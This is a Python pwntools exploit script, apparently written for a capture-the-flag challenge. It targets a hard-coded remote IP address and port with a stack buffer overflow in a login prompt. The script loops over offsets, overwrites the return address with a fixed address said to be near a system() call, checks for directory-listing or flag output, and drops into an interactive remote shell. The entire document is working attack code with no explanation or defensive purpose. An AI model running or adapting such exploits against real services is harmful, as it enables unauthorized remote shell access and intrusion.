from pwn import *

# --- Connection Details ---
HOST = '23.146.248.136'
PORT = 31579

# NEW, more stable return address (one byte before the system() call)
# This can help with stack alignment issues.
SHELL_ADDRESS = 0x40135D 

def attempt_overflow(offset):
    try:
        conn = remote(HOST, PORT, timeout=3)
        
        conn.recvuntil(b'> ')
        conn.sendline(b'1')

        conn.recvuntil(b'Enter your username:')
        conn.sendline(b"user")

        conn.recvuntil(b'Enter your password:')
        
        payload = b'A' * offset + p64(SHELL_ADDRESS)
        conn.sendline(payload)

        # If we succeed, the shell will be waiting.
        conn.sendline(b"ls -la") 
        response = conn.recvline()
        if b"total" in response or b"flag" in response: # Check for typical 'ls' output
            return conn

        conn.close()
        return None

    except (EOFError, PwnlibException):
        return None


def solve():
    # Let's try a wider range just in case.
    for offset in range(0, 60):
        log.info(f"[*] Testing offset: {offset}")
        
        conn = attempt_overflow(offset)
        
        if conn:
            log.success(f"[+] IT WORKED! Found correct offset: {offset}!")
            log.info("[+] Dropping you into the shell...")
            conn.interactive()
            return

    log.failure("[-] Automated exploit failed. This may require manual debugging with GDB.")


if __name__ == "__main__":
    solve()